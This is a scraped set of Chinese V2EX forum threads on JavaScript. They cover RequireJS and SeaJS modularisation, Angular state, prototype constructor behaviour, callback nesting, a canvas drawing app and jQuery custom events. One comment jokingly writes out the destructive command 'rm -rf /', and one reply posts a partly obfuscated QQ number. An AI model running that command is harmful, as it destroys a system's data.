{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网站是php 作为后端，现在公司外包出去，我的任务就是把外包写的凌乱的js 模块化（我打算用Seajs 或Requirejs ）。网站有个后台可以管理模版的，模版文件夹里有存放插件的文件夹和公共部分的文件夹的模版，这些模版里有包含script 标签，我如果把这些script 抽出来做成js 文件，那么怎么在php 其他页面引用这个模块时候，也把这模块要用的js 文件一同加载进去？</p>\n</div></div>"], "reply": "6", "tittle": "手上有个准备重构的项目，前端求指点。", "comment": ["使用一个隐藏域放置你抽取出来的JS文件的地址，当包含模块的页面被加载的时候，使用seajs动态读取隐藏域中指定的JS文件地址并加载", "1. 整理现有业务 结构\r", "2. 整理现有业务 逻辑\r", "3. 重新抽象设计 业务分类 组织结构\r", "4. 重新抽象设计 文件分类 组织结构\r", "5. 基本上可以开始工作了\r", "以上均省略 前端 修饰\r", "\r", "不要一开始就工作，那是做死，做到一半发现要填前面挖的坑。。。。。。。。\r", "开始工作宁可多花点时间，对于后期是比较省事的。。。。。。。。。。", "最好别动. 改bug的时候再小部分重构.\r", "重构基本策略:\r", "* 理清当前逻辑. 加测试，描述现有代码的功能 ( mocha + chai + karam runner )\r", "* 重构, 需要顶一个目标， 避免为了重构而重构. (最好用webstorm)\r", "* 保证测试通过.\r", "\r", "重构目的: \r", "* 使代码逻辑更清晰，方便修复bug\r", "* 调整结构， 方便扩展\r", "\r", "SeaJS or RequireJS 模块化建议后面在做.  \r", "先用这种格式把代码控制起来再模块化.\r", "\r", "(function(win, $) {\r", "})(window, jQuery);", "  是啊，我真奇怪这个外包用了mootool 和jquery。我把用jquery 都用闭包 包含起来了。", " 这方法可行？用SeaJS 或者 RequireJS 在main.js 写读取hidden input 的值？", " 是否可行需要楼主去尝试，因为我说的只是思路；另外在我自己的项目中，使用该方法可以解决我的问题；但是因为文字方式的表述未必能清楚传达你我的本意，所以请楼主多尝试\\(^o^)/~"]},
{"content": ["<div class=\"topic_content\">之前用过angular做后台系统，但是有一天有人提出不能同时打开多个页面操作。其实我在做的时候也发现这个：\r<br>\r<br>1 当我去查询一个东西，然后再点这个去到详细页，然后返回，发现场景不能保留了。\r<br>2 还有就是多任务，比如填一个表单时，我还要查看另一个页面。\r<br>\r<br>总的来说，在这些view的加载中，每次都会刷新了。有没有搞过</div>"], "reply": "11", "tittle": "angular 能不能多任务操作", "comment": ["页面现场还原？　在hash中带上当前页面的参数，然后返回的时候hash改变，根据当前hash把页面里面的数据（ui等）根据参数重新加载，就ｏｋ了\r", "至于你说的多任务，还真不知道你说的是什么意思", "ui-route\r", "ui-view", " 就是可以同时打开多个页面操作。", " 有没有结合这2个的例子", " 这个就更不懂了... 像2L说的，用ui-route , ui-view来搞吧, 至于有关表单控件的现场还原,我写了个angualr组件,不过有点丑，如果有时间可以去看下大概的思路：\r", "打开多个页面没问题啊，这是浏览器的功能，不是 App 的功能吧。\r", "\r", "要保存页面的状态，就要把状态和 URL 对应，要多详细就可以有多详细，这样就可以在历史记录里前进后退了。\r", "\r", "不过说回来，如果你的一个操作需要看两个页面来完成，那一定是应用逻辑有问题。（比如你要添加一个用户，但不知道用户组 ID 是什么，得让操作的人去其他页面复制过来。那为什么不给他一个 select 选择组呢？）", " demo在这　 ", "\r", "填好表单后，可以刷新下页面看下效果", "1. 用route参数来重现数据\r", "2. 新开个窗口", "没有所谓Angular做不到的事情（除了兼容IE6/7这个真做不到），NG只是一种前端的架构方式，原生JS能做的，NG也能做。\r", "\r", "1.若需要保存现场，一是route通过解析url hash，二、比如要保存用户输入，那可以将用户的输入放入到cookie或local storage中，下次进入页面（url）的时候提前读取之\r", "\r", "2.多任务。Javascript是单线程的，不存在所谓多任务一说，想要是一个页面能显示两个窗口，这就是ui的设计或者交互的问题了，简单做的话直接 window.open 新开窗口就OK", "体主是问在一个浏览器Window下打开多个tab并保持状态是吧，为什么不用ng-show?", " 此话怎\r", "解"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>除了把 js 都压缩了一遍，合并成一个文件，r.js 还优化了什么？<br>\n在async加载模式了做了优化？</p>\n</div></div>"], "reply": "2", "tittle": "r.js 优化了什么", "comment": ["就只是减少请求", "不是还附带压缩么"]},
{"content": ["<div class=\"topic_content\">可以在网页上直接运行 C 代码（不需要后端编译），并且支持简单的调试功能。</div>", "<div class=\"topic_content\">这里有个简单的支持不完善的 C++ 解释器：https://github.com/felixhao28/JSCPP\r<br>继续找合适的轮子</div>", "<div class=\"topic_content\">我要找的是一个 C 语言版的 <a target=\"_blank\" href=\"http://www.codeskulptor.org/\" rel=\"nofollow\">http://www.codeskulptor.org/</a> 类似工具，并不是把已有的 C 语言程序编译了到处跑……</div>"], "reply": "14", "tittle": "有没有 JS 写的 C 语言解释器？", "comment": ["把C用JavaScript编译成asm.js这样的库似乎没有。。。 CC @", "see ", "\r", "你再移植个GCC/clang吧。。。", " 想过了，只是启动太慢实在是……", " 试了一下，那东西是带 gcc 的，然而我写了个 hello world 现在编译了二十分钟了一点动静都没有……\r", "\r", "```\r", "#include <stdio.h>                                                              \r", "int main(){printf(\"Hello world!\\n\"); return 0;}\r", "```\r", "\r", "这么写应该没问题吧……我都开始怀疑我代码写错了", " 好了二十分钟以后我看到它出东西了\r", "\r", "hda: irq timeout: status=0xd0 {Busy}                                          \r", "ide: failed opcode was: unknown", " 终于圆了我想看 rm -rf / 的梦想", "llvm一个clang咯。", " 性能肯定惨不忍睹，不过有一种方法是把 C 作为解释型语言来运行，比如检测到 cout 就输出。", " 我就是这个意思", "把 c 编译成 js 的到是有。\r", " 看过了……然而还是需要一个后端来编译。我还是希望能在浏览器里面搞定一切 >_<", " 感觉困难... 编译一个 helloworld 简单, 然而要支持 stdio.h 就不简单了", "google搞的那个pnacl。", " 把 clang 前端折腾成 llvm bytecode 然后 emscripten？\r", " 只需要支持最简单的字符输入输出……应该难度不是很大吧。\r", " 这个有点像 emscripten……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近经常逛quora，很多人都提到了js非常有前途，以及钱途。<br>\n因为对js没什么深入的了解，所以想问一下为什么？<br>\njs现在能做哪些很厉害的事情？<br>\n就问问，别喷</p>\n</div></div>"], "reply": "10", "tittle": "越来越多的看到 js 的身影 但是不太清楚为什么", "comment": ["请去了解NodeJS", "1. 企业应用从CS架构转BS或者直接SaaS，前后端分离（前端SPA，后端提供服务）是大势所趋，页面渲染从后转前需要大量JS\r", "2. 桌面应用UI层在向web技术转移，Web渲染对于做UI尤其是跨平台UI优势很大（例：Visual studio Code, 有道字典，Slack）\r", "3. 移动应用Hybrid做已经很广泛，现在也出现了用JS做脚本的native应用方式（fb的reactNative, Telerik 的NativeScript）\r", "4. 后端的Nodejs", "前端html5的活动页面是个需求，包括微信里面的经常很火的活动。\r", "后端NodeJS发展也很快。\r", "js能写各种脚本工具，命令行工具。\r", "js同样能在某些工具的帮助下写客户端应用。", "Cocos2d-JS可以用来做游戏，我觉得还是满有意思的。", "因为它是标准。", "Server / Web / Client / Cli / 可视化 / 3D / 游戏\r", "\r", "哇，都可以哟。", " 还有嵌入式哦", "qt\\qml\r", "\r", "自动化测试\r", "\r", "js跑spark比python快很多", "全栈", "主要是因为 Node.js 的出现"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>层次太多之后分不清哪个是哪个<br>\n特别是在参数中直接传一个匿名函数，然后直接调用这个函数，里面又有其他逻辑，东西多了就有点分不清了<br>\n各位都是怎么看的，有技巧吗？<br>\nj</p>\n</div></div>"], "reply": "48", "tittle": "javascript 的括号太多之后看不清层次", "comment": ["coffeescript……\r", "\r", "如果只是看的话 换个好的 IDE 都有括号提示的", "弃之，改写  python就没这个烦恼了", " IDE是有提示，但是某些情况还是看着晕", "1. 换个好的IDE，如Webstorm；\r", "2. 用CoffeeScript辅助编写；\r", "3. 养成良好的习惯，避免过度嵌套，该隔开的隔开，该注释的注释。", "缩进搞好点会不会比较好些", " 小的js用webstom太慢，我用notepad++也不差啊，\r", "别人的代码你也不能强求吧，另外还有压缩过的，即使合适化了，有些也看着眼花", " notepad++是不差，但顶多是瑞士军刀，比不上Webstorm这专业大杀器，太慢的话建议升级电脑，别亏待自己，当然没钱升级是另外一回事。\r", "既然是别人的代码，只能自己硬啃，多加点注释把代码段隔开，这种真的没多少技巧。", "用 Promise 避免嵌套。", "用两个空格缩进是趋势。。。。。逃）", " 这个好\r", "\r", " 你的括号打反了 (逃", " 到底是两个空格还是一个tab，另外空格也分全角和半角，反正都看不清… 感觉也是个坑", " 空格党表示必须空格啊 ，写js还是应该想方法比如用then.js避免深层嵌套吧", "代码风格很重要", "async.js、promise", "{\r", "    {\r", "        {\r", "               ;\r", "        }\r", "    }\r", "}", "function a(){\r", "    var b = {\r", "\r", "    }//b end\r", "}//a end", "推荐promise", "这么多嵌套说明要重构成小函数了。", "同建议promise，这个必须先完全熟练掌握，后面觉得多得话只能学会IDE高亮，超过一页就只能前后括号来回跳转着看了。", "重构成多个小函数+1", "同,即使有IDE或者编辑器提示是关闭哪个括号的,但是不能同时显示所有括号吧", "这不就是回调地狱嘛，从代码格式（例如缩进，高亮对齐）下手都是治标，重构优化逻辑结构治本。\r", "\r", "有人还特意注册了一个网站，就还一篇文章 ", "学lisp", "用 PureScript 吧", "赶紧写python去", "lisp系笑而不语", " 学完lz要变成括号僵尸了^o^", " 想起特工偷代码的那个笑话了", " 噗噗噗", "ES6", " 论python缩进的好处XD", "我也来说句, lisp大法好", "听到python时我尽无言以对。", "po主可以看我头像开心开心....", " 缩进一删，代码就废\r", "论python的保密性（", "Brackets 的括号高亮不错，喜欢 sublime 的话可以装一个 Brackets 的插件。", " \r", " \r", " \r", " \r", "\r", "学python 2还是3\r", "论python的版本兼容", " 目前2的库还是丰富一些吧", " 保密完了要手动恢复也是基本无解啊", "$(document).ready(                                                             function(){\r", "    $(\"button\").click(                                                             function(){\r", "        $.get(\"demo_test.asp\",                                               function(data, status){\r", "            alert(\"Data: \" + data + \"\\nStatus: \" + status);        }); });", "其实我要打的是这个样子的。\r", "keep your code shallow", "选个顺手的IDE, 写的时候注意换行和缩进, 层次还是很清晰的.\r", "上webstorm吧...个人感觉非常好用...各种高亮也是很符合习惯的", " 你这样何苦呢，coffeescript很适合你", "如果是callback hell造成的嵌套太多，CoffeeScript也没什么用的，不过就是从很多括号变成了很多缩进而已，如果你还是用2空格缩进，一样看得很痛苦……别人写的代码只能忍了，自己可控的代码可以用async/await/generator/promise/CPS逃离callback hell", " 会有人在代码里用全角字符吗？", " 比如有打中文的时候啊，一不小心忘了切回来……", " 这也算。。一般遇到全角字符编译器/解释器就直接报错了吧？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"kd\">function</span> <span class=\"nx\">A</span> <span class=\"p\">()</span> <span class=\"p\">{};</span>\n<span class=\"kd\">function</span> <span class=\"nx\">B</span> <span class=\"p\">()</span> <span class=\"p\">{};</span>\n<span class=\"nx\">B</span><span class=\"p\">.</span><span class=\"nx\">prototype</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">A</span><span class=\"p\">();</span>\n<span class=\"kd\">var</span> <span class=\"nx\">a</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">A</span><span class=\"p\">();</span>\n<span class=\"kd\">var</span> <span class=\"nx\">b</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nx\">B</span><span class=\"p\">();</span>\n<span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">a</span><span class=\"p\">.</span><span class=\"nx\">constructor</span><span class=\"p\">);</span> <span class=\"c1\">// A</span>\n<span class=\"nx\">log</span><span class=\"p\">(</span><span class=\"nx\">b</span><span class=\"p\">.</span><span class=\"nx\">constructor</span><span class=\"p\">);</span> <span class=\"c1\">// A</span>\n</pre></div>\n\n<p>js中实例是有一个constructor属性指向它的构造函数的。<br>\n如上面的A类的实例a，它的constructor属性就指向A。<br>\n但是当B继承了A之后，B的实例b的constructor指向的却不是B类，而是父类A。</p>\n</div></div>", "<div class=\"topic_content\">很显然，js高级程序设计p145对于实例有个constructor属性的描述是错误的，这丫根就是原型上的，而不是实例自带的属性。</div>"], "reply": "48", "tittle": "有关 JavaScript 中实例的 constructor 属性的问题。", "comment": ["markdown不起作用啊...谁教教我怎么搞。", "原来还要选择markdown...不能改成默认的么...", "constructor 属性是在构造函数的原型对象上的。你这里将 B 的原型对象赋值成一个 A 类实例，此时 B 的原型对象上的就没有 constructor，但继承了 A 的原型链 ，于是 log(b.constructor); 输出的是原型链上 A 的原型对象上的 constructor 即 A 函数。（好像有点乱，我也是个新手，个人是这么理解的。）", " 我去...做了个实验，实例上没有constructor属性...《JS高程》上讲过实例有constructor属性的啊...xd你的理解是对的。", "see ", "\r", "see ", "  看这里，秘密花园 => ", "   ==>[对象.原型]", " 我讲constructor属性...你给的两个链接连毛的constructor都没见着..", " 《js高程》的p145讲了实例也有constructor属性...但明显错了，原型对象才有constructor属性...实例的能访问constructor属性是因为原型上有...", "Object.constructor \r", "\r", "\r", "Object.prototype.constructor\r", "\r", "\r", "但是想知道为什么实例 b.constructor 指向构造函数 A 不是 B 呢？", " 看三楼的，因为原型对象是有constructor属性的，而实例没有。b.constructor是沿着原型链搜索到了A.prototype.constructor。", " 的确，学习了。\r", "哪个天煞的教材当时写了对象.constructor这样的东西！", " 《js高级程序设计》...", "引用一段来自 Backbone 的继承方法\r", "\r", "`\r", "  function A () {};\r", "  function B () {};\r", "\r", "  var Surrogate = function(){ this.constructor = B; };\r", "  Surrogate.prototype = A.prototype;\r", "  B.prototype = new Surrogate;\r", "\r", "  var a = new A();\r", "  var b = new B();\r", "  console.log(a.constructor);\r", "  console.log(b.constructor);\r", "`", " 干脆不管constructor...", "B.prototype.constructor = A\r", "\r", "直接覆盖原型的话，要修正一下这个属性", "可以理解为是引用实例的构造函数的一种方式？", " 虽然这个属性没什么卵用，但我们还是应该尽量保持它的正确性，万一哪天你想在实例化以后修改原型链，可以用a. constructor.prototype.xxx = ... 来修改", " 原型继承的话... B.prototype.constructor指向的不就是A么...", " 说的也是哦～", " 嗯，就是找到这个对象对应的类是哪个，一般用于类型检验吧。", "函数有prototype属性指向原型对象\r", "原型对象有constructor属性，指向构造函数\r", "实例内部有[[Protype]]指向原型对象\r", "实例的属性访问，先看实例自己有没有，有就返回，没有就沿着原型对象找\r", "A什么都没做，constructor指向A\r", "B的protype被重写了，此时指向的是A的实例，b.constructor先查实例，没找到，再查原型对象(A的实例)，没找到，继续找A的原型对象，找到了A.constructor=构造函数A", " 说错了。。 改成 B 。。", " 是[[Prototype]]...", "JavaScript 中的所有对象都可以看作是 Object 对象的实例，因此所有对象都继承了 Object.prototype 上的方法和属性，所以，所有对象都有 constructor 这个属性，《JavaScript 高级程序设计》这本书上的说法是没有问题的，实例也是对象，原型对象也是对象，凡是 JavaScript 中的对象都有 constructor 属性，没有任何问题。", "用 console.dir() 既知", "话说原型的 constructor 这个属性有啥用？（然而并没有什么卵用。）", " 但是它没有指出这玩意是继承来的，而不是自带的...两个方式产生的结果完全不同，就像我一直以为这个属性是自带的，所以才会问出这个问题。", " 用来对实例进行类型判断。", " 这东西没有 instanceof 靠谱吧，毕竟可以随意修改。", "我用词有误， Object 是构造函数，不是对象，所有的构造函数都有 prototype 属性，prototype 里面存放的是构造函数创建的所有实例的原型对象，所有实例可以共享原型对象的属性 (properties) 和方法 (methods) ，constructor 就是所有实例共享的属性之一。", " 实例和实例的原型对象是紧密关联的，原型对象所拥有的，相对的实例也必然也有，所以不存在 constructor 属于哪一个的说法。\r", "如果按你的补充中的思路来看，JavaScript 中只有 Object.prototype 有 constructor 属性，其他对象都只是继承而已。", "所谓原型就是指一个对象最初始的样子，构造函数就像一台机器（或者说一个加工厂），不断的照着原型对象的样子来生产对象，生产出来的对象都是照着 [原型对象] 的模子做的，当你把 prototype 重写了，那么 [原型对象] 的模子也变了，所以构造函数会照着新的模子来生产对象，只不过这个新的模子也是照着另外的模子被生产出来的，所谓继承，就是这么实现。", " 你说了很多...但是这个问题仅仅就是constructor是继承来的还是自带的而已...来个方式带来两个结果...显然《js高程》的叙述并不严谨...", " 我说了很多是因为我也需要自己理清一下思路，之前我的理解并不算清晰，就着你的问题，我愿意捋一捋之前所学的知识 :)", " →_→ 我花了半年刷完《js高程》，然而并没有什么卵用...", "因为\r", "\r", "function B () {};  // B.prototype.constructor === B\r", "B.prototype = new A();  // B.prototype.__proto__.constructor === A\r", "\r", "另外其实想知道每一步执行之后A和B的原型链都是什么模样可以用console啊……Chrome的不太好用，Firefox的可以看得很清楚，执行完之后点击A或者B看右边会列出所有的东西", " 直接说constructor是继承来的不就得了...", " 其实我一直觉得在JavaScript的范围里说继承是件挺奇怪的事……就是搭原型链而已，说继承联想到普通的OO反而更迷惑", " 继承来的也就是自带的不是么，总不能凭空出现吧，打个通俗的比喻，一个男孩继承了他父亲一样的棕色的眼镜，但这双眼睛是男孩自己的不是别人的，只是眼睛的颜色恰好跟他父亲的眼睛的颜色一样叫“棕色”。上面所说的 constructor 就是这个“棕色”一样的东西。", " 因为习惯了继承...", " 不是这个意思，自带就像是function A(){}，然后A就有prototype这个属性了。是语言设计层面的...", " 其实只要把 JavaScript 的 OO 部分都看成在原型链这个“搜索路径”上做文章，然后知道 new 和创建函数会对这条搜索路径干什么事，各种引用是怎么搜索的，完全不要去联想 C++/Java 那种 OO，就一切都很自然……", "昂......路過.......表示题主头像是我做的哦............好欣慰~", " 我在lofter上看到的...直接盗用了...", " 看看es6就知道js肯定会向Java那类语言的OO靠拢的...慢慢变成工业级语言...", "Class.prototype.constructor", " ES6 的 class 本质还是 prototype，类似于 CoffeeScript 的 class，纯粹的语法糖……而且 TC39 也是倾向于只让它停留在语法糖的层面上，现在在 es-discuss 谈论给 JavaScript 加上“真正的OO”的人基本都会被婊……", "JavaScript基于原型链的继承，B.prototype = new A(); 相当于 B.prototype.constructor ===  a.constructor === A\r", "\r", "所以：\r", "log(a.constructor); // A\r", "log(b.constructor); // A\r", "\r", "类似这种情况，需要手动改回B.property.constructor，即：B.prototype.constructor = B\r", "\r", "但这种继承方式多了一步 new A（相当于做了2次new A），为了避免内存浪费，可以使用下面的方式：\r", "function A () {};\r", "function B () {};\r", "function F () {}; (空函数)\r", "\r", "F.prototype = A.prototype\r", "B.prototype = new F()\r", "B.prototype.constructor = B\r", "\r", "var a = new A();\r", "var b = new B();\r", "\r", "log(a.constructor); // A\r", "log(b.constructor); // B\r", "\r", "PS，这种方式也有缺点（B只继承了A.prototype上的属性），如这样就有错误了：\r", "function A () {\r", "\tthis.foo = \"only a\";\r", "};\r", "function B () {};\r", "\r", "function F () {};\r", "F.prototype = A.prototype\r", "B.prototype = new F()\r", "B.prototype.constructor = B\r", "\r", "var a = new A();\r", "var b = new B();\r", "\r", "log(b.foo)  //undefined\r", " \r", "\r", "更完美的方案，可以看看 CoffeeScript / TypeScript 生成的JS代码，很清晰。 :)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近常常在用Saveform的油猴脚本下youtube的视频，自手上有个用Vps搭建的反向代理，会将请求XXX.YYY.mylocal.domain/ZZZ的流量代理到XXX.googlevideo.com/ZZZ详见 <a target=\"_blank\" rel=\"nofollow\" href=\"http://v2ex.com/t/183220\">http://v2ex.com/t/183220</a><br>\n现在问题来啦，有时候需要几乎一个专辑传网盘离线，就算复制链接一个一个改也快抓狂了<br>\n有点C的基础，扫了一下Saveform的Js，发现就是通过Api获取源地址，基本无法改<br>\n而我的基础只能支持我部分读写，无法自写<br>\n有人能提供一下能实现类似功能的教程/模版吗？</p>\n</div></div>"], "reply": "2", "tittle": "如何用 JS 替换网页中的下载链接", "comment": ["关键词：\r", "\r", "querySelector\r", "innerHTML\r", "href\r", "getAttribute/setAttribute\r", "replace", "大神没工夫，菜鸟来一发\r", "    <script>\r", "        window.onload= function () {\r", "            for(var a = document.getElementsByTagName('a'), len = a.length, i = 0 ;i < len; i++){\r", "                var newA = a[i].getAttribute('href').replace(/\\w+\\.mylocal\\.domain/,'googlevideo.com');\r", "                a[i].setAttribute('href',newA);\r", "            }\r", "        };  //将href中的字符串XXX.YYY.mylocal.domain/ZZZ替换为XXX.googlevideo.com/ZZZ\r", "    </script>\r", "\r", "路过高手求教使用for/in改写"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近扒网站 - palleton，<br>\n一个单页app，<br>\n主模块（requirejs的data-main指向的文件）app.compiled.js里面，<br>\n出现了这样的结构：</p>\n\n<p>开头<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://i.imgur.com/cIEcXdz.png\">http://i.imgur.com/cIEcXdz.png</a></p>\n\n<p>结尾<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://i.imgur.com/8yUYHjo.png\">http://i.imgur.com/8yUYHjo.png</a></p>\n\n<p>定义了多个相互依赖的模块。<br>\n想问下这样的结构是什么原理？<br>\n（requirejs文档没有讲这种结构。<br>\n搜了下网上也只是说一个文件写一个模块，再用Optimizer来弄）</p>\n</div></div>"], "reply": "9", "tittle": "使用 requireJS 在同一个文件里定义多个模块的方法？", "comment": ["\r", "\r", "BTW: 代码片段请发Gist，发图片阅读很麻烦", " gist被墙了。没开代理连这页的回复框都刷不出来。我还以为贴被封了。谢谢但回答没有帮助。", "这个文件貌似还就是optimization tool生成的", " 这种结构真难读懂啊", "感觉应该是r.js 合并生成的。这一般是发布的时候build tools 来生成的代码。", "要在同一个文件声明多个模块，就像 2L 说的一样，显式在 define 第一个参数指定模块名。文档里说是不推荐这么做的，而是统一约定一个文件一个模块，用文件名表示模块名。\r", "\r", "楼主贴的这段代码是 Optimizer 生成的。它把每个文件的代码嵌入到了一个自调用里：\r", "(function () {\r", "    // my-module-foo.js\r", "}).call(this),\r", "(function () {\r", "    // my-module-bar.js\r", "}).call(this);\r", "\r", "因为这时所有模块合并到了一个文件，没法用文件名做模块名了。所以 Optimizer 把原来的文件名加到了 define 第一个参数。\r", "(function () {\r", "    // my-module-foo.js\r", "    define(\"my-module-foo\", [], function { /* ... */ });\r", "}).call(this),\r", "(function () {\r", "    // my-module-bar.js\r", "    define(\"my-module-bar\", [], function { /* ... */ });\r", "}).call(this);\r", "\r", "所以就有了这样的结构。", "有时候一个模块里定义多个模块的需要还是有的，比如模板，一起作为一个目录给别人用总觉得怪怪的，这时候就有合并的需求。\r", "我把主模块定义为匿名模块，模板定义为一个命名模块（有命名空间），然后匿名模块将模块依赖就可以了，requirejs会自动将匿名模块作为加载合并文件时的模块定义。\r", "\r", "[", "amd推荐的开发模式是一个文件只写一个模块，同时推荐只定义匿名的模块。也就是这样：\r", "\r", "比如, app/index.js里边的代码应该是\r", "\r", "// 这里定义一个匿名模块\r", "define(function (require) {\r", "\r", "  // 这里明确写出所有的依赖\r", "  var common = require('../common/index');\r", "\r", "  // 这里是模块输出\r", "  return {};\r", "\r", "});\r", "\r", "那么在使用r.js或者其他构建工具的时候，通过语法分析找到相关的数据（主要是路径和依赖），会编译成一个具名且明确依赖的模块，并且将依赖放到前边，比如app/index.js会被编译成这样：\r", "\r", "define('common/index', [], function (require) { /*.. */})\r", "\r", "define('app/index', ['../common/index'], function (require) { /* .. */ });\r", "\r", "合并的原因是，不合并的amd脚本根本没办法用。一个页面上异步加载好几十个脚本，然后才算启动成功，太low了，根本不能用到生产环境上。。。\r", "\r", "当然还有其他方面的考虑，请参考amd的规范。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最简单粗暴的代码：</p>\n<div class=\"highlight\"><pre>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;script src=\"http://code.jquery.com/jquery-1.11.2.min.js\"&gt;&lt;/script&gt;\n    &lt;script src=\"holder.js\"&gt;&lt;/script&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;img data-src=\"holder.js/300x200\"&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</pre></div>\n\n<p>本地可以直接跑，为什么在 JinJa2 in Flask 中就无法渲染成功呢。代码未改，没有出现资源加载错误。</p>\n</div></div>"], "reply": "1", "tittle": "有没用过 holder.js 这个插件的，为何总跑不起来？", "comment": [" 试试这个吧，我也是因为 holder 用起来出错，太麻烦， 所以自己做的一个，目前公司的好几个项目都用这个。\r", "\r", "官网： "]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>求大神轻拍砖 <br>\n如果卡的话，刷新2遍就好了。。。</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://draw-board.herokuapp.com/\">http://draw-board.herokuapp.com/</a></p>\n</div></div>", "<div class=\"topic_content\">最近在忙写这个论文，下周就要答辩了。等答辩完了，我优化一下代码结构。\r<br>\r<br>优化的点：\r<br>1、根据用户的屏幕初始化canvas大小，有选项可以调整canvas大小\r<br>2、增加用户鼠标mouse cursor\r<br>3、增加工具tooltip\r<br>4、优化虚线的结构\r<br>5、后台nodejs改用php</div>"], "reply": "41", "tittle": "毕设做了个纯 canvas 画板", "comment": ["两个建议\r", "1. mouse cursor比较重要，因为绘画要定位置，最好改个合适的。\r", "2. layout能不能用flex，别用absolute。", "测试了一下，Mac下的safari刷不出来。chrome成功了。", "保存可以直接保存文件的，参考 ", "在我电脑上看起来有点奇怪，浏览器宽度大概为1230", "有时候橡皮擦会有点问题", " 请问你这个绘画板是基于什么语言的？", "第一句看成了：请大神经 拍砖", " 除了js还能有什么语言？", "好厉害，居然还能把刚画的东西缓存起来。\r", "提点建议，能不能把每次画的东西都给个自由变换的框，可以拖动、旋转、缩放等，那样就更完美了", "面板布局有点奇怪，不过功能完成度蛮高啊", "在IE下保存文件的时候我也遇到了同样的问题,我还没有研究出怎么解决.\r", "可以参考一下 ", " ,他在IE下是打开一个新窗口,然后自己选图片令存为,也算是勉强的解决方案.", " 这个试了下,在IE11下可用,谢谢!", "加个素描笔刷吧！\r", "这样我就会经常玩这个噜！", "应该是insert text，不是insert font吧", "0, 0 用了react 啊， 数据存在 local storage 同一个key\r", "~~挺好的", "求源代碼分享學習～\r", "橡皮擦的形狀有時會是上一次使用畫筆的形狀。", "嗯，体验过后，感觉问题还比较多：\r", "1. 这么个简单的应用，不应该上 Bootstrap，过大；\r", "2. 初始线条宽度 50 有点大；\r", "3. 工具栏应该加一下 title (tooltip)；\r", "4. 方框工具线条宽度可以调到 0，但无效；\r", "5. 虚线不应该是一段一段出来，应该指哪画到哪；\r", "6. 插入文字最好做到 inline，在想要输入的地方输入；\r", "7. 插入图片的 API 503 了。\r", "\r", "不过仍然是一个好应用。", "要是能更完善 我买下~", "上下移动图层位置。。并不能让画板上两个图层的层叠关系 互换。。bug", "另外一个 我这 mac 的 chrome 上 所有 画笔 橡皮擦之类的 选择后鼠标仍然是指针，不会变成对应的图标。。不会 就是这样的吧", " 当时我也想的是可以改动每次绘画的形状，自由变换，但是感觉好难做=。=", " 素描笔刷是什么喵", " 是的，多谢建议，我应该多自己测一下哒> . <", " 图层功能应该是完好的，上下移动图层位置是可以的啊。。。。。", " 大财主！我一定好好完善！！~~", "是不是用canvas画的东西，边缘都会有点模糊？", " 貌似是的，但是有数学方法优化好像。", "赞！", " 如果后端是php，那么希望来我们的平台试试部署你这个应用： ", "贴图为什么要把图片传到后端去……\r", "FileAPI读一下前端用dataURI就好，参考：\r", "做个微信适配也不错，画完可以直接分享。", " 原谅我孤陋寡闻了，这么棒的API！！~~~", " 当时想了做个简易的设配，简易工具栏，后续工程吧", "size调整有bug", " 请说明如何触发bug，bug的效果样子", "还不错，加油吧，骚年", "不错呀", "素描笔刷就是类似两头细中间粗，带微小颗粒感的笔刷", " 先用画笔调整大小，然后换到橡皮调整大小，橡皮的大小和画笔一样，size无效，差不多就这样", "留个联系方式吧QQ? 有个类似画板的商业项目想找你，这论坛也没私信功能。", " 企鹅4969661九九，加我说明v2画板"]},
{"content": ["<div class=\"topic_content\">书中讲到jQuery自定义事件时举了这样一个例子，使用自定义事件来移除container中的tooltip，而别的container中的tooltip不受影响：\r<br>\r<br>请问代码中的$tooltip是什么？为什么这样做就会 each tooltip will listen to its container？跟事件冒泡有关吗？\r<br>\r<br>中文版在此： <a target=\"_blank\" href=\"http://www.itxueyuan.org/view/6933.html\" rel=\"nofollow\">http://www.itxueyuan.org/view/6933.html</a>\r<br>\r<br>谢谢。\r<br>\r<br>But implementing this behavior with event logic rather than selector logic is easy.\r<br> \t\r<br>// $container could be $('#sidebar') or $(document)\r<br> \t\r<br>$container.triggerHandler('newTooltip');\r<br> \t\r<br>$container.one('newTooltip', function() {\r<br> \t\r<br>  $tooltip.remove();\r<br> \t\r<br>});\r<br>(Notice the use of jQuery’s one instead of on. The difference is that one automatically removes the handler after it fires.)\r<br>\r<br>With these two lines of code, each tooltip will listen to its container and remove itself when the container gets a new tooltip.</div>", "<div class=\"topic_content\">如果例子中的代码是错的，要用自定义事件实现这样的功能应该怎么做呢？</div>"], "reply": "6", "tittle": "在读<Async Javascript>(《JavaScript 异步编程》），请教一个小问题", "comment": ["jQ支持使用自定义事件，对tooltip做自定义事件，以后要移除制定的时间，只需做个trigger的动作，而不会影响到因使用$('.tooltip').remove() 这个方法导致移除所有的tooltip。。\r", "不知道这样说正不正确，有点头晕，哈哈", "这例子写的太不清楚，建议跳过。", "例子想说明的是自定义事件的用法, 新建一个事件, 然后触发. \r", "$tooltip 是示例代码, 和事件没有关系.", "$tooltip 应该是指任意一个tooltip的实例，这边应该是想表达:\r", "注册个自定义事件`newTooltip`,任何一个tooltip在实例化时，都需要先触发一下自定义事件，然后用one方法在$container上注册下handler。以便于在规定的$container内同一时间只有1个tooltip显示.", 